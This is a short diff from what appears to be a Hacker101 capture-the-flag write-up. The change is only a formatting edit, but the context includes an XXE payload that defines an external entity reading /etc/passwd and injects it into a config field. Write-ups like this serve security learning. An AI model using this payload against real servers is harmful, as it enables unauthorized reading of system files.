@@ -6,7 +6,7 @@ In the admin page we have a comment:
 
 https://xxxxxxxxxxxx.ctf.hacker101.com/get-config
 
-On top of the page there is '<?xml version="1.0" encoding="UTF-8"?>' which indicates the server uses xml for config.
+On top of the page there is `<?xml version="1.0" encoding="UTF-8"?>` which indicates the server uses xml for config.
 
 xxe payload: `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><config><location>&xxe;</location></config>`
 
